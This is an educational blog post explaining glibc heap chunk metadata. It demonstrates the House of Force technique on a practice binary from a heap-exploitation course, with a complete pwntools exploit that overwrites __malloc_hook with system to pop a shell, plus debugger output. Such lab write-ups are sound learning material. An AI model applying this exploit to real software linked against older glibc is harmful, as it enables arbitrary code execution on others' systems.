<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Basic Heap Exploitation: House of Force :: Adam Gold — Writing about security and programming</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="I recently finished a Linux heap exploitation course (Referral link is instructor&amp;rsquo;s, not mine!), aimed to teach how the heap works and some popular exploitation techniques that are possible to execute once you are familiar with the heap&amp;rsquo;s metadata. In this short article, I will try to showcase some of the things that I have learned, with some examples.
Learning the Basics of the Heap Before diving into the exploitation details, you first need to understand what the heap is and its metadata structure."/>
<meta name="keywords" content="blog, security, programming, python, developer"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/" />


<base href="https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/">
<meta name="url" content="https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/" />
<meta property="og:locale" content="en">

 
  <title itemprop="name">Basic Heap Exploitation: House of Force | Adam Gold</title>
  <meta itemprop="name" content="Basic Heap Exploitation: House of Force | Adam Gold" />
  <meta name="description" content="I recently finished a course on Linux heap exploitation, aimed to teach how the heap works and some popular exploitation techniques that are possible to execute once you are familiar with the heap&#39;s metadata. In this short article, I will try to showcase some of the things that I have learned, with some examples." />
  <meta itemprop="description" content="I recently finished a course on Linux heap exploitation, aimed to teach how the heap works and some popular exploitation techniques that are possible to execute once you are familiar with the heap&#39;s metadata. In this short article, I will try to showcase some of the things that I have learned, with some examples." />
  
  
  

  <meta property="og:type" content="article" />
  <meta property="og:image" content="https://adamgold.github.io/img/heap_visual.png" />
  <meta property="article:publisher" content="" /> 
  <meta property="og:article:published_time" content=2020-08-01T17:47:42&#43;0300 /> 
  <meta property="article:published_time" content=2020-08-01T17:47:42&#43;0300 />
  
  
  
  



<script type="text/javascript" src="/scripts/global.js"></script><script type="application/ld+json">
	
	{
	  "@context": "https://schema.org",
	  "@type": "BlogPosting",
	  "headline": "Basic Heap Exploitation: House of Force",
	  "image": "https://adamgold.github.io/img/heap_visual.png",
	  "datePublished": "2020-08-01T17:47:42+03:00",
	  "dateModified": "2020-08-01T17:47:42+03:00",
	  "author": {
	    "@type": "Person",
	    "name": "Adam Gold"
	  },
	  "mainEntityOfPage": { "@type": "WebPage" },
	  "description": "I recently finished a Linux heap exploitation course (Referral link is instructor\u0026rsquo;s, not mine!), aimed to teach how the heap works and some popular exploitation techniques that are possible to execute once you are familiar with the heap\u0026rsquo;s metadata. In this short article, I will try to showcase some of the things that I have learned, with some examples.\nLearning the Basics of the Heap Before diving into the exploitation details, you first need to understand what the heap is and its metadata structure.",
	  "keywords": ["binary-exploitation", "pwning", "heap"]
	}
	
	{
	  "@context": "https://schema.org",
	  "@type": "Organization",
	  "name": "Adam Gold - Writing about security and programming",
	  "url": "https://adamgold.github.io/",
	  "sameAs": [
	    "https://twitter.com/adamgolds",
	    "https://github.com/adamgold"
	  ]
	}
</script>




<link rel="stylesheet" href="https://adamgold.github.io/assets/style.css">


<link rel="stylesheet" href="https://adamgold.github.io/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://adamgold.github.io/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="https://adamgold.github.io/img/favicon.png">


<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://adamgold.github.io/img/heap_visual.png"/>

<meta name="twitter:title" content="Basic Heap Exploitation: House of Force"/>
<meta name="twitter:description" content="I recently finished a course on Linux heap exploitation, aimed to teach how the heap works and some popular exploitation techniques that are possible to execute once you are familiar with the heap&#39;s metadata. In this short article, I will try to showcase some of the things that I have learned, with some examples."/>



<meta property="og:title" content="Basic Heap Exploitation: House of Force" />
<meta property="og:description" content="I recently finished a course on Linux heap exploitation, aimed to teach how the heap works and some popular exploitation techniques that are possible to execute once you are familiar with the heap&#39;s metadata. In this short article, I will try to showcase some of the things that I have learned, with some examples." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/" />
<meta property="og:image" content="https://adamgold.github.io/img/heap_visual.png" />
<meta property="article:published_time" content="2020-08-01T17:47:42+03:00" />
<meta property="article:modified_time" content="2020-08-01T17:47:42+03:00" /><meta property="og:site_name" content="Adam Gold" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">Adam Gold</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="https://github.com/AdamGold">GitHub</a></li>
        
      
        
          <li><a href="https://www.linkedin.com/in/adamgold7/">LinkedIn</a></li>
        
      
        
          <li><a href="/index.xml">RSS</a></li>
        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="https://github.com/AdamGold">GitHub</a></li>
      
    
      
        <li><a href="https://www.linkedin.com/in/adamgold7/">LinkedIn</a></li>
      
    
      
        <li><a href="/index.xml">RSS</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title"><a href="https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/">Basic Heap Exploitation: House of Force</a></h1>
    <div class="post-meta">
      
        <span class="post-date">
          2020-08-01
        </span>

        
          
        
      

      
      
        <span class="post-read-time">— 8 min read</span>
      
    </div>

    
      <span class="post-tags">
        
          #<a href="https://adamgold.github.io/tags/binary-exploitation/">binary-exploitation</a>&nbsp;
        
          #<a href="https://adamgold.github.io/tags/pwning/">pwning</a>&nbsp;
        
          #<a href="https://adamgold.github.io/tags/heap/">heap</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://adamgold.github.io/img/heap_visual.png" class="post-cover" />
      
    

    <div class="post-content">
      
      <p>I recently finished a Linux heap exploitation <a href="https://www.udemy.com/course/linux-heap-exploitation-part-1/?referralCode=362370A773BCC3F2730A">course</a> (Referral link is instructor&rsquo;s, not mine!), aimed to teach how the heap works and some popular exploitation techniques that are possible to execute once you are familiar with the heap&rsquo;s metadata. In this short article, I will try to showcase some of the things that I have learned, with some examples.</p>
<h2 id="learning-the-basics-of-the-heap">Learning the Basics of the Heap</h2>
<p>Before diving into the exploitation details, you first need to understand what the heap is and its metadata structure.</p>
<h3 id="what-is-the-heap">What is the heap?</h3>
<p>The heap is the portion of memory where dynamically allocated memory resides. Dynamic memory allocating is used when a program does not know the size or number of objects in memory it needs prior to runtime (hence dynamic).
Unlike the stack where memory is allocated and released in a very defined order, individual data elements allocated on the heap are typically released in ways which is asynchronous from one another.</p>
<p>Heap memory is essentially a large pool of memory (typically per process) from which the running program can request chunks during runtime. The heap is divided into &ldquo;chunk&rdquo; - large, contiguous blocks of memory requested from the kernel.</p>
<p>You may think that this is only relevant to low-level programming, for example the usage of <code>malloc</code> in C (which will be covered later in this article) - But the heap is actually being used under the hood in many of the basic programming operations, even in high level languages such as Python or Ruby.</p>
<p>The heap is organized and implemented by a series of data structures, forming the heap metadata.</p>
<div class="toast toast--blue add-margin">
	<div class="toast__content">
		<p class="toast__type">Note</p>
		<p class="toast__message">
			It&rsquo;s important to note that throughout this post, only the GLIBC heap implementation will be discussed.
		</p>
	</div>
</div>

<h3 id="heap-metadata">Heap Metadata</h3>
<p>In order to see and understand how the heap is implemented, you will need to have an understanding of the <code>malloc</code> function.</p>
<p>GLIBC&rsquo;s <code>malloc</code> function allows developers to request dynamic memory allocation. It takes a single argument - the size in bytes, and returns a pointer to that amount of memory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>e <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">16</span>);
</code></pre></div><p>As you can see, it&rsquo;s very simple to use. This means that all of the &ldquo;magic&rdquo; happens under the hood - And what can be more exciting than unrevealing it?</p>
<div class="toast toast--blue add-margin">
	<div class="toast__content">
		<p class="toast__type">Note</p>
		<p class="toast__message">
			If you wish to explore further, you can check out <code>malloc</code>'s <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">source code</a>.
		</p>
	</div>
</div>

<h3 id="debugging-with-gdb">Debugging with <code>gdb</code></h3>
<p>Suppose a programmer asks for, say, 16 bytes of memory. To service this request, the heap manager needs to do more than just find a random 16 byte region that the programmer can write to. The heap manager also needs to store metadata about the allocation. This metadata is stored alongside the 16-byte region that the programmer can use.</p>
<p>Let&rsquo;s hop onto <code>gdb</code> to see how it plays out.</p>
<pre><code>In file: /home/adamgold/Documents/malloc_demo.c
    5     char *e = malloc(16);
    6
    7     malloc(1);
    8     malloc(0);
    9
   10     malloc(24);
   11     malloc(25);
   12
 ► 13     return 0;
   14 }

</code></pre><p>The code above requests 5 chunk - with sizes of 16, 1, 0, 24 and 25. The breakpoint is set just after the request for the 25-bytes chunk. Using the <code>vis_heap_chunks</code> (or <code>vis</code>) command to display the heap, you can inspect the heap layout:</p>

<figure >
    
        <img class="center" src="/img/heap_visual.png"
             />
        
    
</figure>

<p>Let&rsquo;s break it down: We can see 7 different colors, although only 5 chunk requested. As mentioned before, metadata is stored inline - The heap does not store user data alone.</p>
<p>There are 4 parts that start with <code>0x0000000000000021</code> followed by 24 bytes. The first 8 bytes are the size field - It&rsquo;s where the size of each chunk is saved, along with some flags such as the &ldquo;prev in use&rdquo; flag. The following 24 bytes are the user data. You can see that 24 bytes have been assigned to all of the first 4 requests - Even though we requested for 16, 1, 0 and 24 respectively. This is because <code>malloc</code> has a minimum chunk size of 24 bytes of user data - even when using <code>malloc(0)</code>. So, the size is filled with <code>0x20</code> (=32), which is 24 bytes of user data + 8 bytes of meta data.
After that, you can see a size field of <code>0x31</code>. This means that the size field increment in 8 each time - 40 bytes for <code>malloc(25)</code>. This is why the least significant bit is not used (<code>0x20</code>, <code>0x30</code>, <code>0x40</code>&hellip;) and can be used for flags.</p>
<p>If you were wondering what the &ldquo;prev in use&rdquo; flag does - It&rsquo;s there to mark if the previous chunk is freed or not. Chunks are in either of 2 mutually exclusive states: allocated or free. When a chunk is free, up to 5 quadwords of its user data are repurposed as metadata.</p>
<p>The last value - <code>0x0000000000020f51</code> states the size of the &ldquo;top chunk&rdquo; - meaning the size of all the remaining memory in the heap.</p>
<p>This is where we&rsquo;ll stop exploring the heap metadata for this post - But there is much more to learn, such as the types of freed chunks, unlinking vulnerabilities, and many more. The House of Force technique does not require this knowledge.</p>
<h2 id="discovering-the-house-of-force-technique">Discovering the House of Force Technique</h2>
<p>The House of Force technique is a simple one for achieving code execution on older binaries. It does not rely on complicated internal logics (such as House of Orange, for example) but it is a good start and, yeah, it&rsquo;s pretty cool!</p>
<h3 id="understanding-the-theory">Understanding the theory</h3>
<p>In GLIBC versions &lt; 2.29, top chunk size fields are not subject to any integrity checks during allocations. This means that you can write any value into it.</p>
<p>Basically, what you are going to be doing is to overflow a chunk in order to write a really large value into the &ldquo;wilderness&rdquo;, the top chunk. This will allow you to wrap around the virtual address space and then when you make another request, you&rsquo;ll be able to get any address you want in memory. For example, you&rsquo;ll be able to get addresses from the binary data section (which is in a lower address than the heap). Sounds complicated? Fear not! Let&rsquo;s exploit an actual binary.</p>
<h3 id="exploiting-a-binary-using-house-of-force">Exploiting a binary using House of Force</h3>
<p>We are going to exploit a very simple binary, just to showcase the HOF technique. The binary is available after purchasing the course.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; checksec
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
    RUNPATH:  <span style="color:#e6db74">&#39;../.glibc/glibc_2.28_no-tcache&#39;</span>
pwndbg&gt; r
Starting program: /home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force

<span style="color:#f92672">===============</span>
|   HeapLAB   |  House of Force
<span style="color:#f92672">===============</span>

puts<span style="color:#f92672">()</span> @ 0x7ffff7a8ef10
heap @ 0x603000

1<span style="color:#f92672">)</span> malloc 0/4
2<span style="color:#f92672">)</span> target
3<span style="color:#f92672">)</span> quit

</code></pre></div><p>The binary leaks the address of libc <code>puts</code> and the heap base address for simplicity. It is linked to GLIBC 2.28, so we can use the HOF technique.</p>
<p>After some time playing with the binary, it seems that there&rsquo;s a heap overflow when using the malloc functionality. Here&rsquo;s a quick proof of concept showing an override of the top chunk:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;house_of_force&#34;</span>)
libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc

io <span style="color:#f92672">=</span> start()

gs <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">continue
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug(elf<span style="color:#f92672">.</span>path, gdbscript<span style="color:#f92672">=</span>gs)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> process(elf<span style="color:#f92672">.</span>path)

<span style="color:#75715e"># Select the &#34;malloc&#34; option, send size &amp; data.</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(size, data):
    io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;1&#34;</span>)
    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;size: &#34;</span>, f<span style="color:#e6db74">&#34;{size}&#34;</span>)
    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;data: &#34;</span>, data)
    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>)

<span style="color:#75715e"># This binary leaks the address of puts(), use it to resolve the libc load address.</span>
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;puts() @ &#34;</span>)
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline(), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts

<span style="color:#75715e"># This binary leaks the heap start address.</span>
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;heap @ &#34;</span>)
heap <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline(), <span style="color:#ae81ff">16</span>)
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>)

malloc(<span style="color:#ae81ff">24</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xffffffffffffffff</span>))

io<span style="color:#f92672">.</span>interactive()
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; vis

0x603000	0x0000000000000000	0x0000000000000021	........!.......
0x603010	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x603020	0x5959595959595959	0xffffffffffffffff	YYYYYYYY........ &lt;-- Top chunk

</code></pre></div><p>What&rsquo;s left to do now is to get a shell by interrupting the program flow, easy right?</p>
<p>We can use <code>__malloc_hook</code>, a function that is being called before <code>malloc</code> - Overriding it with the <code>system</code> address could give a shell!</p>
<p>The distance from the top chunk required to is <code>MALLOC_HOOK_ADDRESS - (HEAP_BASE + 0x20)</code>. Notice the <code>0x20</code> required to account for the already allocated chunk. We can add the following allocation:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">distance <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>__malloc_hook <span style="color:#f92672">-</span> (heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20</span>)
malloc(distance, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
</code></pre></div><p>And when running the script with gdb:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; dq &amp;__malloc_hook
00007ffff7dd0c10     <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">0000000000000000</span>
00007ffff7dd0c20     <span style="color:#ae81ff">0000000000000000</span> ffff8000088323f9
00007ffff7dd0c30     <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">0000000000000000</span>
00007ffff7dd0c40     <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">0000000000000000</span>
pwndbg&gt; top_chunk
Top chunk
Addr: 0x7ffff7dd0c20
Size: 0xffff8000088323f9
</code></pre></div><p>Great! Our <code>top_chunk</code> is right at the start of <code>__malloc_hook</code>. One more request will enable us to overwrite the hook.</p>
<p>But before we do that, <code>system</code> will have to be called with <code>/bin/sh</code>. We can insert <code>bin/sh</code> right before the hook - as we know the address there. For that to work, we would need to overwrite <code>0x20</code> bits before the hook, write <code>/bin/sh</code>, and then make one more allocation request for the actual address overriding. Final exploit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;house_of_force&#34;</span>)
libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc

io <span style="color:#f92672">=</span> start()

gs <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">continue
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug(elf<span style="color:#f92672">.</span>path, gdbscript<span style="color:#f92672">=</span>gs)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> process(elf<span style="color:#f92672">.</span>path)

<span style="color:#75715e"># Select the &#34;malloc&#34; option, send size &amp; data.</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(size, data):
    io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;1&#34;</span>)
    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;size: &#34;</span>, f<span style="color:#e6db74">&#34;{size}&#34;</span>)
    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;data: &#34;</span>, data)
    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>)

<span style="color:#75715e"># This binary leaks the address of puts(), use it to resolve the libc load address.</span>
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;puts() @ &#34;</span>)
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline(), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts

<span style="color:#75715e"># This binary leaks the heap start address.</span>
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;heap @ &#34;</span>)
heap <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline(), <span style="color:#ae81ff">16</span>)
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>)

malloc(<span style="color:#ae81ff">24</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xffffffffffffffff</span>))
distance <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>__malloc_hook <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">-</span> (heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20</span>)
malloc(distance, <span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># start with /bin/sh and place the chunk right before malloc hook</span>
malloc(<span style="color:#ae81ff">24</span>, p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system)) <span style="color:#75715e"># overwrite malloc hook</span>

cmd <span style="color:#f92672">=</span> heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span> <span style="color:#75715e"># address to /bin/sh (parameter to malloc which is essentialy parameter to system)</span>
malloc(cmd, <span style="color:#e6db74">&#34;&#34;</span>)

io<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>And there&rsquo;s our shell!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adamgold@adamgold-VirtualBox:~/Documents/courses/HeapLAB/house_of_force$ python3 exp.py
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
    RUNPATH:  b<span style="color:#e6db74">&#39;../.glibc/glibc_2.28_no-tcache&#39;</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/adamgold/Documents/courses/HeapLAB/.glibc/glibc_2.28_no-tcache/libc-2.28.so&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&#39;</span>: pid <span style="color:#ae81ff">23154</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
$ whoami
adamgold
</code></pre></div>
    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
            
              <span class="button next">
                <a href="https://adamgold.github.io/posts/python-hash-tables-under-the-hood/">
                  <span class="button__text">Python Hash Tables Under the Hood</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    


    
      
        <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "adam-gold" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

      
    

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">Adam Gold</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
      </div>
    
  </div>
</footer>

<script src="https://adamgold.github.io/assets/main.js"></script>
<script src="https://adamgold.github.io/assets/prism.js"></script>


      
    </div>

    
      
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-171406341-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    
  </body>
</html>
